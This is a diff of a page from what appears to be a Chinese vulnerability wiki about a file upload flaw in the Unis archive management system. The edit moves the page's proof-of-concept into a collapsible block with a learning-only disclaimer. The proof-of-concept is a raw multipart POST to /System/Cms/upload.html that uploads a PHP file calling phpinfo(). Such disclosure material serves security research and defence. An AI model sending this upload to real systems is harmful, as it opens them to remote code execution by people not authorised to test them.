@@ -39,8 +39,10 @@ app="紫光档案管理系统"
 
 ![image-20230314084534337](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084534337.png)
 
-```
-POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
 Host: 
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Encoding: gzip, deflate
@@ -68,9 +70,10 @@ Content-Disposition: form-data; name="token"
 Content-Disposition: form-data; name="files[]"; filename="phpinfo.php"
 Content-Type: text/php
 
-<?php phpinfo();?>
-------WebKitFormBoundarygIRYWNxmDYiZBguT--
-```
+&lt;?php phpinfo();?&gt;
+------WebKitFormBoundarygIRYWNxmDYiZBguT--</code></pre>
+
+</details>
 
 ![image-20230314084553654](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084553654.png)
 
